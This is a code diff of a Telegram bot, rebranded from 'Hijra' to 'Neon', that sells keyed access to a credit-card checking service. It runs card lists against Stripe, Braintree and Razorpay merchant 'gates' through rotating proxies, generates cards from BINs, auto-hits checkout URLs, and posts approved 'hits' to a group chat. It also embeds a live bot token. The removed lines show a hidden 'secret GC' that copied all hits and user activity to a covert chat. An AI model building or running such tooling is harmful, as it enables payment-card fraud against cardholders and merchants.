@@ -1,5 +1,6 @@
 # ============================================================
-#  Telegram Bot — Hijra
+#  Telegram Bot — Neon
+#  made by talkneon
 # ============================================================
 
 import os
@@ -15,12 +16,9 @@ import requests
 from typing import Dict, Any, Optional
 from datetime import datetime
 from auth_checker_v2 import check_card as auth_check_card, probe_site as auth_probe_site, update_config as auth_update_config, get_config as auth_get_config
-from meduza_gates import (
-    sa1_check_card, sa1_probe_site,
-    sa2_check_card, sa2_probe_site,
-    nvbv_check_card, nvbv_probe_site,
-    chg3_check_card, chg3_probe_site,
-)
+from chr1_checker import check_card as chr1_check_card, probe_site as chr1_probe_site, update_config as chr1_update_config, get_config as chr1_get_config
+from b3_checker import check_card as b3_check_card, probe_site as b3_probe_site
+from rpay_checker import check_card as rpay_check_card, probe_site as rpay_probe_site, load_rpay_sites, save_rpay_sites, validate_site as rpay_validate_site
 from dlx_tools import generate_cards, vbv_lookup, analyze_url, scrape_proxies
 
 try:
@@ -39,8 +37,7 @@ except ImportError:
 #  Configuration
 # ============================================================
 BOT_TOKEN = "8190896455:AAFXvW4eVTDvESHw_SHYxHCRXngxYnMJKqc"
-BOT_NAME = "Hijra"
-DEVELOPER = "Hijra"
+DEVELOPER = "Neon"
 ADMIN_IDS = [5342093297]
 
 DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")
@@ -52,6 +49,8 @@ GATE_STATS_FILE = os.path.join(DATA_DIR, "tg_gate_stats.json")
 GATE_STATUS_FILE = os.path.join(DATA_DIR, "tg_gate_status.json")
 SETTINGS_FILE = os.path.join(DATA_DIR, "tg_settings.json")
 PROXIES_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "proxies.txt")
+SITES_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sites.txt")
+RPAY_SITES_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "rpay_sites.txt")
 
 os.makedirs(DATA_DIR, exist_ok=True)
 
@@ -85,10 +84,6 @@ def get_proxy():
         proxy_str = _global_proxies[_proxy_index % len(_global_proxies)]
         _proxy_index += 1
     return format_proxy(proxy_str)
-
-
-def get_next_proxy():
-    return get_proxy()
 
 
 def get_random_proxy():
@@ -170,7 +165,7 @@ def update_gate_stats(gate, results):
 
 
 # ============================================================
-#  Settings (GC + Secret GC)
+#  Settings (GC chat ID etc.)
 # ============================================================
 def load_settings():
     return _load_json(SETTINGS_FILE, {})
@@ -187,20 +182,12 @@ def set_notification_gc(chat_id):
     settings["notification_gc"] = chat_id
     save_settings(settings)
 
-def get_secret_gc():
-    settings = load_settings()
-    return settings.get("secret_gc")
-
-def set_secret_gc(chat_id):
-    settings = load_settings()
-    settings["secret_gc"] = chat_id
-    save_settings(settings)
-
 
 # ============================================================
-#  Notification senders
+#  Notification sender
 # ============================================================
 def notify_gc(text):
+    """Send a notification to the configured group chat."""
     gc_id = get_notification_gc()
     if not gc_id:
         return
@@ -210,84 +197,28 @@ def notify_gc(text):
         pass
 
 
-def notify_secret(text):
-    """Send to secret GC — all hits, activity logs."""
-    gc_id = get_secret_gc()
-    if not gc_id:
-        return
-    try:
-        send_message(gc_id, text)
-    except Exception:
-        pass
-
-
-def _fmt_hit_notification(user_id, username, gate_label, card_line, detail, elapsed=""):
-    """Hijra hit format for notifications."""
-    name = f"@{username}" if username else str(user_id)
-    # Get BIN info
-    cc_num = card_line.split('|')[0] if '|' in card_line else card_line
-    bin6 = cc_num[:6] if len(cc_num) >= 6 else cc_num
-    try:
-        bin_info, _ = bin_lookup(bin6)
-    except Exception:
-        bin_info = None
-
-    brand = bin_info.get('brand', '?') if bin_info else '?'
-    bank = bin_info.get('bank', '?') if bin_info else '?'
-    country = bin_info.get('country', '?') if bin_info else '?'
-    emoji = bin_info.get('emoji', '') if bin_info else ''
-
-    return (
-        f"⍟━━━⌁ <b>Hijra</b> ⌁━━━⍟\n\n"
-        f"[🝂] <b>𝗖𝗔𝗥𝗗:</b> <code>{card_line}</code>\n"
-        f"[🝂] <b>𝗚𝗔𝗧𝗘𝗪𝗔𝗬:</b> <code>{gate_label}</code>\n"
-        f"[🝂] <b>𝗦𝗧𝗔𝗧𝗨𝗦:</b> Approved ✅\n"
-        f"[🝂] <b>𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘:</b> <code>{detail}</code>\n\n"
-        f"⍟━━━━⍟ <b>𝗗𝗘𝗧𝗔𝗜𝗟𝗦</b> ⍟━━━━⍟\n"
-        f"[🝂] <b>𝗕𝗜𝗡:</b> {brand} - <code>{bin6}</code>\n"
-        f"[🝂] <b>𝗕𝗔𝗡𝗞:</b> {bank}\n"
-        f"[🝂] <b>𝗖𝗢𝗨𝗡𝗧𝗥𝗬:</b> {country} {emoji}\n\n"
-        f"[🝂] <b>𝗧𝗜𝗠𝗘 𝗧𝗢𝗢𝗞 ⌁</b> {elapsed}\n"
-        f"[🝂] <b>𝗖𝗛𝗘𝗖𝗞𝗘𝗗 𝗕𝗬 ➺</b> {name}\n"
-    )
-
-
 def notify_hit(user_id, username, gate_label, card_line, detail):
-    """Notify both GC and secret GC about a hit."""
-    # Extract elapsed time from detail if present
-    elapsed = ""
-    if " | " in detail:
-        parts_d = detail.rsplit(" | ", 1)
-        if parts_d[-1].endswith("s") and parts_d[-1][:-1].replace(".", "").isdigit():
-            elapsed = parts_d[-1]
-
-    hit_msg = _fmt_hit_notification(user_id, username, gate_label, card_line, detail, elapsed)
-    notify_gc(hit_msg)
-    notify_secret(hit_msg)
+    """Notify GC about a hit/approved card."""
+    name = f"@{username}" if username else str(user_id)
+    notify_gc(
+        f"<b>HIT</b>\n\n"
+        f"User: {name}\n"
+        f"Gate: <code>{gate_label}</code>\n"
+        f"Card: <code>{card_line}</code>\n"
+        f"Result: {detail}\n\n"
+        f"<i>{DEVELOPER}</i>"
+    )
 
 
 def notify_new_user(user_id, username, key_info=""):
+    """Notify GC about a new user registration."""
     name = f"@{username}" if username else str(user_id)
-    msg = (
-        f"⍟━━━⌁ <b>Hijra</b> ⌁━━━⍟\n\n"
-        f"[🝂] <b>NEW USER</b>\n\n"
+    notify_gc(
+        f"<b>New User</b>\n\n"
         f"User: {name}\n"
         f"ID: <code>{user_id}</code>\n"
-        f"{key_info}\n"
-    )
-    notify_gc(msg)
-    notify_secret(msg)
-
-
-def notify_activity(user_id, username, text_preview):
-    """Log any activity to secret GC."""
-    name = f"@{username}" if username else str(user_id)
-    is_authed = is_authorized(user_id)
-    status = "Authorized" if is_authed else "⚠️ Unauthorized"
-    notify_secret(
-        f"<b>[Activity]</b> {name} ({status})\n"
-        f"ID: <code>{user_id}</code>\n"
-        f"Msg: <code>{text_preview[:80]}</code>"
+        f"{key_info}\n\n"
+        f"<i>{DEVELOPER}</i>"
     )
 
 
@@ -319,10 +250,9 @@ def set_gate_enabled(gate_key, enabled, by_user=None):
 # ============================================================
 GATE_PROBE_MAP = {
     "auth": {"name": "Stripe Auth", "cmd": "/chkapiauth"},
-    "sa1": {"name": "Stripe Auth CCN", "cmd": "/chkapisa1"},
-    "sa2": {"name": "Stripe Auth CVV", "cmd": "/chkapisa2"},
-    "nvbv": {"name": "BT Non-VBV", "cmd": "/chkapinvbv"},
-    "chg3": {"name": "Stripe Charge $3", "cmd": "/chkapichg3"},
+    "chr1": {"name": "Stripe Charge", "cmd": "/chkapichr1"},
+    "b3": {"name": "Braintree Auth", "cmd": "/chkapib3"},
+    "rpay": {"name": "Razorpay Charge", "cmd": "/chkapirpay"},
 }
 
 
@@ -331,14 +261,17 @@ def probe_gate(gate_key):
     try:
         if gate_key == "auth":
             alive, detail = auth_probe_site()
-        elif gate_key == "sa1":
-            alive, detail = sa1_probe_site()
-        elif gate_key == "sa2":
-            alive, detail = sa2_probe_site()
-        elif gate_key == "nvbv":
-            alive, detail = nvbv_probe_site()
-        elif gate_key == "chg3":
-            alive, detail = chg3_probe_site()
+        elif gate_key == "chr1":
+            alive, detail = chr1_probe_site()
+        elif gate_key == "b3":
+            alive, detail = b3_probe_site()
+        elif gate_key == "rpay":
+            sites = load_rpay_sites()
+            if sites:
+                alive, detail = rpay_probe_site(sites[0])
+            else:
+                alive = False
+                detail = "No sites — add with /rpaysite"
         else:
             return False, 0, "Unknown gate"
 
@@ -395,7 +328,7 @@ def fmt_duration(seconds):
 
 
 def generate_key():
-    return "HJ-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=16))
+    return "TN-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=16))
 
 
 def is_admin(user_id):
@@ -547,6 +480,15 @@ def send_document(chat_id, filepath, filename=None, caption=None):
                 pass
 
 
+def send_photo(chat_id, photo_url, caption=None, reply_markup=None):
+    params = {"chat_id": chat_id, "photo": photo_url, "parse_mode": "HTML"}
+    if caption:
+        params["caption"] = caption
+    if reply_markup:
+        params["reply_markup"] = reply_markup
+    return tg_request("sendPhoto", **params)
+
+
 # ============================================================
 #  Proxy helpers
 # ============================================================
@@ -669,14 +611,19 @@ def test_proxy_connectivity(proxy_str):
             last_error = f"HTTP {resp.status_code}"
         except requests.exceptions.ProxyError:
             last_error = "Proxy tunnel failed"
+            continue
         except requests.exceptions.ConnectTimeout:
             last_error = "Connection timeout"
+            continue
         except requests.exceptions.ReadTimeout:
             last_error = "Read timeout"
+            continue
         except requests.exceptions.ConnectionError:
             last_error = "Connection error"
+            continue
         except Exception as e:
             last_error = f"Error: {str(e)[:80]}"
+            continue
     return False, 0, last_error
 
 
@@ -694,6 +641,65 @@ def _rand_ua():
     return random.choice(USER_AGENTS)
 
 
+def _retry_request(func, max_retries=2, backoff=2):
+    last_err = None
+    for attempt in range(max_retries + 1):
+        try:
+            result = func()
+            if hasattr(result, 'status_code') and result.status_code == 429:
+                wait = backoff * (attempt + 1)
+                time.sleep(wait)
+                last_err = "HTTP 429"
+                continue
+            return result
+        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError,
+                requests.exceptions.Timeout, requests.exceptions.ReadTimeout) as e:
+            last_err = str(e)
+            if attempt < max_retries:
+                time.sleep(backoff * (attempt + 1))
+            continue
+        except Exception as e:
+            raise e
+    raise requests.exceptions.ConnectionError(f"All {max_retries + 1} attempts failed: {last_err}")
+
+
+# ============================================================
+#  Shopify sites loader
+# ============================================================
+def load_shopify_sites():
+    if not os.path.exists(SITES_FILE):
+        return []
+    with open(SITES_FILE, 'r') as f:
+        return [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
+
+
+# ============================================================
+#  RPay sites loader + round-robin (for /rpay gate)
+# ============================================================
+_rpay_site_index = 0
+_rpay_site_lock = threading.Lock()
+
+
+def _load_rpay_sites():
+    return load_rpay_sites()
+
+
+def _save_rpay_sites(sites):
+    save_rpay_sites(sites)
+
+
+def get_next_rpay_site():
+    """Round-robin site selection for rpay gate."""
+    global _rpay_site_index
+    sites = load_rpay_sites()
+    if not sites:
+        return None
+    with _rpay_site_lock:
+        site = sites[_rpay_site_index % len(sites)]
+        _rpay_site_index += 1
+    return site
+
+
 # ============================================================
 #  Gate runner
 # ============================================================
@@ -701,19 +707,21 @@ def _run_gate(gate, c_num, c_mm, c_yy, c_cvv, proxy_dict):
     cc_line = f"{c_num}|{c_mm}|{c_yy}|{c_cvv}"
     if gate == "auth":
         return auth_check_card(cc_line, proxy_dict)
-    elif gate == "sa1":
-        return sa1_check_card(cc_line, proxy_dict)
-    elif gate == "sa2":
-        return sa2_check_card(cc_line, proxy_dict)
-    elif gate == "nvbv":
-        return nvbv_check_card(cc_line, proxy_dict)
-    elif gate == "chg3":
-        return chg3_check_card(cc_line, proxy_dict)
+    elif gate == "chr1":
+        return chr1_check_card(cc_line, proxy_dict)
+    elif gate == "b3":
+        return b3_check_card(cc_line, proxy_dict)
+    elif gate == "rpay":
+        site_url = get_next_rpay_site()
+        if not site_url:
+            return "Error | No sites — add with /rpaysite"
+        return rpay_check_card(cc_line, proxy_dict, site_url=site_url)
     else:
         return auth_check_card(cc_line, proxy_dict)
 
 
 def _get_rotating_proxy(proxies_list, max_tries=3):
+    """Get up to max_tries different proxies for rotation."""
     if not proxies_list:
         return [None]
     tried = set()
@@ -740,6 +748,7 @@ def process_single_entry(entry, proxies_list, user_id, gate="auth"):
                 if not any(c_num.startswith(b) for b in user_bin_list):
                     return "SKIPPED | BIN not allowed"
 
+            # Connection error patterns that should trigger proxy rotation
             _CONN_ERRORS = [
                 "ProxyError", "Tunnel connection failed", "503 Service Unavailable",
                 "connection failed", "Max retries", "HTTPSConnectionPool",
@@ -747,12 +756,14 @@ def process_single_entry(entry, proxies_list, user_id, gate="auth"):
                 "ReadTimeoutError", "ConnectionResetError", "RemoteDisconnected",
                 "NewConnectionError", "SSLError", "socket.timeout", "ECONNREFUSED",
                 "Connection refused", "Connection timed out", "Connection reset",
-                "ConnError", "Rate limited", "Service unavailable",
+                "ConnError",  # New status from auth_stripe_checker
+                "Rate limited", "Service unavailable",
             ]
 
             def _is_conn_error(r):
                 return isinstance(r, str) and any(e in r for e in _CONN_ERRORS)
 
+            # Try up to 5 proxies with rotation before giving up
             max_proxy_tries = min(5, len(proxies_list)) if proxies_list else 0
             proxy_candidates = _get_rotating_proxy(proxies_list, max_tries=max_proxy_tries) if proxies_list else [None]
             result = None
@@ -764,6 +775,7 @@ def process_single_entry(entry, proxies_list, user_id, gate="auth"):
                     result = _run_gate(gate, c_num, c_mm, c_yy, c_cvv, proxy_dict)
                     if not _is_conn_error(result):
                         break
+                    # Small backoff before next proxy
                     time.sleep(random.uniform(0.3, 0.7))
                 except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError,
                         requests.exceptions.Timeout, ConnectionError, OSError):
@@ -774,12 +786,14 @@ def process_single_entry(entry, proxies_list, user_id, gate="auth"):
                     if not _is_conn_error(result):
                         break
 
+            # Final fallback: direct connection (no proxy)
             if result is None or _is_conn_error(result):
                 try:
                     result = _run_gate(gate, c_num, c_mm, c_yy, c_cvv, None)
                 except Exception as e2:
                     result = f"Error: {str(e2)}"
 
+            # Sanitize: never show raw connection errors to users
             if _is_conn_error(result):
                 result = "Declined | Gateway Timeout"
 
@@ -796,7 +810,7 @@ def process_single_entry(entry, proxies_list, user_id, gate="auth"):
 # ============================================================
 #  Processing runner
 # ============================================================
-DEFAULT_THREADS = 10
+DEFAULT_THREADS = 5
 
 
 def run_processing(lines, user_id, on_progress=None, on_complete=None, threads=DEFAULT_THREADS, gate="auth"):
@@ -828,7 +842,7 @@ def run_processing(lines, user_id, on_progress=None, on_complete=None, threads=D
         detail = result.split(" | ", 1)[1] if " | " in result else result
         return (entry, status, detail, category)
 
-    max_workers = max(1, min(threads, total, 20))
+    max_workers = max(1, min(threads, total, 10))
 
     with ThreadPoolExecutor(max_workers=max_workers) as pool:
         futures = {pool.submit(worker, line): i for i, line in enumerate(lines)}
@@ -860,30 +874,31 @@ def run_processing(lines, user_id, on_progress=None, on_complete=None, threads=D
 
 
 # ============================================================
-#  Message formatters (Hijra branded)
+#  Message formatters
 # ============================================================
 
 def fmt_start(username, user_id):
     name = f"@{username}" if username else "User"
     return (
-        f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\n"
+        f"<b>Neon</b>\n\n"
         f"Welcome, <b>{name}</b>\n"
         f"Your ID: <code>{user_id}</code>\n\n"
-        f"Use /help to see all available commands.\n"
+        f"Use /help to see all available commands and get started.\n\n"
+        f"<i>{DEVELOPER}</i>"
     )
 
 
 def fmt_unauthorized():
     return (
-        f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\n"
         "<b>Access Denied</b>\n\n"
         "You need to redeem a key first.\n"
-        "Use: <code>/redeem YOUR-KEY</code>\n"
+        "Use: <code>/redeem YOUR-KEY</code>\n\n"
+        f"<i>{DEVELOPER}</i>"
     )
 
 
 def fmt_live(idx, total, results, start_time, entry="", status_text="", done=False):
-    title = f"⍟━━━⌁ <b>{'Complete' if done else 'Processing'}</b> ⌁━━━⍟"
+    title = "<b>Complete</b>" if done else "<b>Processing</b>"
     elapsed = time.time() - start_time
     cpm = int((idx / elapsed) * 60) if elapsed > 0 else 0
     eta = int((total - idx) / (idx / elapsed)) if idx > 0 and elapsed > 0 else 0
@@ -901,21 +916,23 @@ def fmt_live(idx, total, results, start_time, entry="", status_text="", done=Fal
         f"ETA: <code>{eta}s</code>\n\n"
         f"Current:\n<code>{entry}</code>\n\n"
         f"Status: {status_text}\n\n"
-        f"✅ Approved: <code>{results['approved']}</code>\n"
-        f"❌ Declined: <code>{results['declined']}</code>\n"
-        f"⏭ Skipped: <code>{results['skipped']}</code>\n"
-        f"⚠️ Errors: <code>{results['errors']}</code>\n"
+        f"Approved: <code>{results['approved']}</code>\n"
+        f"Declined: <code>{results['declined']}</code>\n"
+        f"Skipped: <code>{results['skipped']}</code>\n"
+        f"Errors: <code>{results['errors']}</code>\n\n"
+        f"<i>{DEVELOPER}</i>"
     )
 
 
 def fmt_results(results):
     return (
-        f"⍟━━━⌁ <b>Session Complete</b> ⌁━━━⍟\n\n"
+        "<b>Session Complete</b>\n\n"
         f"Total: <code>{results['total']}</code>\n"
-        f"✅ Approved: <code>{results['approved']}</code>\n"
-        f"❌ Declined: <code>{results['declined']}</code>\n"
-        f"⏭ Skipped: <code>{results['skipped']}</code>\n"
-        f"⚠️ Errors: <code>{results['errors']}</code>\n"
+        f"Approved: <code>{results['approved']}</code>\n"
+        f"Declined: <code>{results['declined']}</code>\n"
+        f"Skipped: <code>{results['skipped']}</code>\n"
+        f"Errors: <code>{results['errors']}</code>\n\n"
+        f"<i>{DEVELOPER}</i>"
     )
 
 
@@ -924,15 +941,16 @@ def fmt_stats(user_id):
     uid = str(user_id)
     s = stats.get(uid)
     if not s:
-        return f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nNo stats yet. Run a session first."
+        return f"<b>No Stats</b>\n\nYou haven't run any sessions yet.\n\n<i>{DEVELOPER}</i>"
     return (
-        f"⍟━━━⌁ <b>Your Stats</b> ⌁━━━⍟\n\n"
+        "<b>Your Lifetime Stats</b>\n\n"
         f"Sessions: <code>{s.get('sessions', 0)}</code>\n"
-        f"Total: <code>{s.get('total', 0)}</code>\n"
-        f"✅ Approved: <code>{s.get('approved', 0)}</code>\n"
-        f"❌ Declined: <code>{s.get('declined', 0)}</code>\n"
-        f"⏭ Skipped: <code>{s.get('skipped', 0)}</code>\n"
-        f"⚠️ Errors: <code>{s.get('errors', 0)}</code>\n"
+        f"Total Processed: <code>{s.get('total', 0)}</code>\n"
+        f"Approved: <code>{s.get('approved', 0)}</code>\n"
+        f"Declined: <code>{s.get('declined', 0)}</code>\n"
+        f"Skipped: <code>{s.get('skipped', 0)}</code>\n"
+        f"Errors: <code>{s.get('errors', 0)}</code>\n\n"
+        f"<i>{DEVELOPER}</i>"
     )
 
 
@@ -940,7 +958,7 @@ def fmt_mykey(user_id):
     users = load_users()
     entry = users.get(str(user_id))
     if not entry:
-        return f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nNo key redeemed."
+        return f"<b>No Key</b>\n\nYou haven't redeemed a key.\n\n<i>{DEVELOPER}</i>"
     key = entry.get("key", "N/A")
     redeemed = datetime.fromtimestamp(entry.get("redeemed_at", 0)).strftime("%Y-%m-%d %H:%M UTC")
     expires_at = entry.get("expires_at")
@@ -953,11 +971,12 @@ def fmt_mykey(user_id):
     ll = entry.get("line_limit")
     limit_text = str(ll) if ll else "Unlimited"
     return (
-        f"⍟━━━⌁ <b>Key Info</b> ⌁━━━⍟\n\n"
+        "<b>Your Key Info</b>\n\n"
         f"Key: <code>{key}</code>\n"
         f"Redeemed: <code>{redeemed}</code>\n"
         f"Expires: <code>{exp_text}</code>\n"
-        f"Line Limit: <code>{limit_text}</code>\n"
+        f"Line Limit: <code>{limit_text}</code>\n\n"
+        f"<i>{DEVELOPER}</i>"
     )
 
 
@@ -967,7 +986,7 @@ def fmt_mykey(user_id):
 def stop_button_markup(user_id):
     return {
         "inline_keyboard": [[
-            {"text": "⬛ Stop", "callback_data": f"stop_{user_id}"}
+            {"text": "Stop", "callback_data": f"stop_{user_id}"}
         ]]
     }
 
@@ -976,16 +995,15 @@ def help_main_markup():
     return {
         "inline_keyboard": [
             [
-                {"text": "🔐 Auth Gates", "callback_data": "help_auth_gates"},
-                {"text": "💳 Charge Gates", "callback_data": "help_charge_gates"},
+                {"text": "Gates", "callback_data": "help_gates"},
+                {"text": "Tools", "callback_data": "help_tools"},
             ],
             [
-                {"text": "🛠 Tools", "callback_data": "help_tools"},
-                {"text": "📋 Commands", "callback_data": "help_commands"},
+                {"text": "Commands", "callback_data": "help_commands"},
+                {"text": "How to Use", "callback_data": "help_howto"},
             ],
             [
-                {"text": "📖 How to Use", "callback_data": "help_howto"},
-                {"text": "👑 Admin", "callback_data": "help_admin"},
+                {"text": "Admin", "callback_data": "help_admin"},
             ],
         ]
     }
@@ -994,7 +1012,7 @@ def help_main_markup():
 def help_back_markup():
     return {
         "inline_keyboard": [[
-            {"text": "◀ Back", "callback_data": "help_back"},
+            {"text": "Back", "callback_data": "help_back"},
         ]]
     }
 
@@ -1009,37 +1027,27 @@ cancel_flags = {}
 
 
 # ============================================================
-#  Gate registry
+#  Gate registry (active gates only)
 # ============================================================
-# Auth gates
-AUTH_GATES = [
-    ("auth", "/auth", "Stripe Auth (WCPay)", True),
-    ("sa1", "/sa1", "Stripe Auth CCN", True),
-    ("sa2", "/sa2", "Stripe Auth CVV", True),
-    ("nvbv", "/nvbv", "BT Non-VBV", True),
+GATE_REGISTRY = [
+    ("auth", "/auth", "Stripe Auth", True),
+    ("chr1", "/chr1", "Stripe Charge", True),
+    ("b3", "/b3", "Braintree Auth", True),
+    ("rpay", "/rpay", "Razorpay Charge", True),
 ]
-
-# Charge gates
-CHARGE_GATES = [
-    ("chg3", "/chg3", "Stripe Charge $3", True),
-]
-
-GATE_REGISTRY = AUTH_GATES + CHARGE_GATES
 
 GATE_MAP = {
     "/auth": ("auth", "Stripe Auth"),
-    "/sa1": ("sa1", "Stripe Auth CCN"),
-    "/sa2": ("sa2", "Stripe Auth CVV"),
-    "/nvbv": ("nvbv", "BT Non-VBV"),
-    "/chg3": ("chg3", "Stripe Charge $3"),
+    "/chr1": ("chr1", "Stripe Charge"),
+    "/b3": ("b3", "Braintree Auth"),
+    "/rpay": ("rpay", "Razorpay Charge"),
 }
 
 CHKAPI_CMDS = {
     "/chkapiauth": "auth",
-    "/chkapisa1": "sa1",
-    "/chkapisa2": "sa2",
-    "/chkapinvbv": "nvbv",
-    "/chkapichg3": "chg3",
+    "/chkapichr1": "chr1",
+    "/chkapib3": "b3",
+    "/chkapirpay": "rpay",
 }
 
 
@@ -1057,6 +1065,7 @@ def handle_callback(update):
     chat_id = cb.get("message", {}).get("chat", {}).get("id")
     msg_id = cb.get("message", {}).get("message_id")
 
+    # Stop button
     if data.startswith("stop_"):
         target_uid = int(data.split("_", 1)[1])
         if cb_user_id == target_uid or is_admin(cb_user_id):
@@ -1066,6 +1075,7 @@ def handle_callback(update):
             answer_callback(cb_id, "Not your task.")
         return
 
+    # Gate disable/enable
     if data.startswith("gate_off_"):
         if not is_admin(cb_user_id):
             answer_callback(cb_id, "Admin only.")
@@ -1076,8 +1086,10 @@ def handle_callback(update):
         answer_callback(cb_id, f"{gate_name} disabled")
         if chat_id and msg_id:
             edit_message(chat_id, msg_id,
-                f"⍟━━━⌁ <b>{gate_name} — DISABLED</b> ⌁━━━⍟\n\n"
-                f"Gate has been turned off.\n")
+                f"<b>{gate_name} — DISABLED</b>\n\n"
+                f"Gate has been turned off.\n"
+                f"Use the check command again to re-enable.\n\n"
+                f"<i>{DEVELOPER}</i>")
         return
 
     if data.startswith("gate_on_"):
@@ -1090,38 +1102,27 @@ def handle_callback(update):
         answer_callback(cb_id, f"{gate_name} enabled")
         if chat_id and msg_id:
             edit_message(chat_id, msg_id,
-                f"⍟━━━⌁ <b>{gate_name} — ENABLED</b> ⌁━━━⍟\n\n"
-                f"Gate is back online.\n")
+                f"<b>{gate_name} — ENABLED</b>\n\n"
+                f"Gate is back online for all users.\n\n"
+                f"<i>{DEVELOPER}</i>")
         return
 
     if data == "gate_keep":
         answer_callback(cb_id, "No changes made.")
         if chat_id and msg_id:
-            edit_message(chat_id, msg_id, f"⍟━━━⌁ <b>No changes made.</b> ⌁━━━⍟")
+            edit_message(chat_id, msg_id, f"<b>No changes made.</b>\n\n<i>{DEVELOPER}</i>")
         return
 
     # Help menu navigation
-    if data == "help_auth_gates":
+    if data == "help_gates":
         answer_callback(cb_id)
         txt = (
-            f"⍟━━━⌁ <b>Auth Gates</b> ⌁━━━⍟\n\n"
+            "<b>Available Gates</b>\n\n"
             "<code>/auth</code>  ·  Stripe Auth (WooCommerce/WCPay)\n"
-            "<code>/sa1</code>  ·  Stripe Auth CCN\n"
-            "<code>/sa2</code>  ·  Stripe Auth CVV\n"
-            "<code>/nvbv</code>  ·  Braintree Non-VBV\n\n"
-            "<i>Auth gates verify card validity without charging.</i>\n"
-        )
-        if chat_id and msg_id:
-            edit_message(chat_id, msg_id, txt, reply_markup=help_back_markup())
-        return
-
-    if data == "help_charge_gates":
-        answer_callback(cb_id)
-        txt = (
-            f"⍟━━━⌁ <b>Charge Gates</b> ⌁━━━⍟\n\n"
-            "<code>/chg3</code>  ·  Stripe Charge $3 (Bloomerang)\n\n"
-            "<i>Charge gates process real transactions.\n"
-            "Live = card got charged successfully.</i>\n"
+            "<code>/chr1</code>  ·  Stripe Charge (WordPress AJAX)\n"
+            "<code>/b3</code>  ·  Braintree Auth (dnalasering)\n"
+            "<code>/rpay</code>  ·  Razorpay Charge\n\n"
+            f"<i>{DEVELOPER}</i>"
         )
         if chat_id and msg_id:
             edit_message(chat_id, msg_id, txt, reply_markup=help_back_markup())
@@ -1130,13 +1131,15 @@ def handle_callback(update):
     if data == "help_tools":
         answer_callback(cb_id)
         txt = (
-            f"⍟━━━⌁ <b>Tools</b> ⌁━━━⍟\n\n"
+            "<b>Tools</b>\n\n"
             "<code>/gen 424242 10</code>  ·  Generate cards from BIN\n"
             "<code>/binlookup 424242</code>  ·  BIN info lookup\n"
             "<code>/binquality 424242</code>  ·  BIN quality check\n"
             "<code>/vbv 4111...</code>  ·  VBV/3DS check\n"
             "<code>/analyze https://...</code>  ·  Detect payment provider\n"
             "<code>/autohitter URL</code>  ·  Auto-hit checkout URL\n"
+            "<code>/filesend</code>  ·  Upload file to server\n\n"
+            f"<i>{DEVELOPER}</i>"
         )
         if chat_id and msg_id:
             edit_message(chat_id, msg_id, txt, reply_markup=help_back_markup())
@@ -1145,14 +1148,15 @@ def handle_callback(update):
     if data == "help_commands":
         answer_callback(cb_id)
         txt = (
-            f"⍟━━━⌁ <b>Commands</b> ⌁━━━⍟\n\n"
+            "<b>Commands</b>\n\n"
             "<code>/bin 424242</code>  ·  Set BIN filter\n"
             "<code>/clearbin</code>  ·  Clear BIN filter\n"
             "<code>/cancel</code>  ·  Stop active task\n"
             "<code>/gates</code>  ·  List all gates + hit rates\n"
             "<code>/stats</code>  ·  Your lifetime stats\n"
             "<code>/mykey</code>  ·  Check your key info\n"
-            "<code>/redeem KEY</code>  ·  Redeem access key\n"
+            "<code>/redeem KEY</code>  ·  Redeem access key\n\n"
+            f"<i>{DEVELOPER}</i>"
         )
         if chat_id and msg_id:
             edit_message(chat_id, msg_id, txt, reply_markup=help_back_markup())
@@ -1161,7 +1165,7 @@ def handle_callback(update):
     if data == "help_howto":
         answer_callback(cb_id)
         txt = (
-            f"⍟━━━⌁ <b>How to Use</b> ⌁━━━⍟\n\n"
+            "<b>How to Use</b>\n\n"
             "<b>Single card:</b>\n"
             "<code>/auth 4111111111111111|01|25|123</code>\n\n"
             "<b>Bulk check:</b>\n"
@@ -1171,7 +1175,10 @@ def handle_callback(update):
             "Reply to a .txt file with:\n"
             "<code>/autohitter https://checkout-url.com</code>\n\n"
             "<b>Generate cards:</b>\n"
-            "<code>/gen 424242 10</code>\n"
+            "<code>/gen 424242 10</code>\n\n"
+            "<b>BIN lookup:</b>\n"
+            "<code>/binlookup 424242</code>\n\n"
+            f"<i>{DEVELOPER}</i>"
         )
         if chat_id and msg_id:
             edit_message(chat_id, msg_id, txt, reply_markup=help_back_markup())
@@ -1180,10 +1187,10 @@ def handle_callback(update):
     if data == "help_admin":
         answer_callback(cb_id)
         if not is_admin(cb_user_id):
-            txt = f"⍟━━━⌁ <b>Admin section is restricted.</b> ⌁━━━⍟"
+            txt = f"<b>Admin section is restricted.</b>\n\n<i>{DEVELOPER}</i>"
         else:
             txt = (
-                f"⍟━━━⌁ <b>Admin Commands</b> ⌁━━━⍟\n\n"
+                "<b>Admin Commands</b>\n\n"
                 "<code>/genkey</code>  ·  Generate single key\n"
                 "<code>/genkeys 10</code>  ·  Bulk generate keys\n"
                 "<code>/adminkey ID 7d</code>  ·  Promote to admin\n"
@@ -1194,8 +1201,11 @@ def handle_callback(update):
                 "<code>/proxy</code>  ·  Proxy pool status\n"
                 "<code>/addproxy</code>  ·  Add proxies to pool\n"
                 "<code>/scrapeproxies</code>  ·  Scrape fresh proxies\n"
+                "<code>/rpaysite</code>  ·  Manage Razorpay sites\n"
                 "<code>/authsite</code>  ·  Set /auth site URL\n"
-                "<code>/chkapis</code>  ·  Health check all APIs\n"
+                "<code>/chr1config</code>  ·  Configure /chr1 gate\n"
+                "<code>/chkapis</code>  ·  Health check all APIs\n\n"
+                f"<i>{DEVELOPER}</i>"
             )
         if chat_id and msg_id:
             edit_message(chat_id, msg_id, txt, reply_markup=help_back_markup())
@@ -1205,7 +1215,7 @@ def handle_callback(update):
         answer_callback(cb_id)
         if chat_id and msg_id:
             edit_message(chat_id, msg_id,
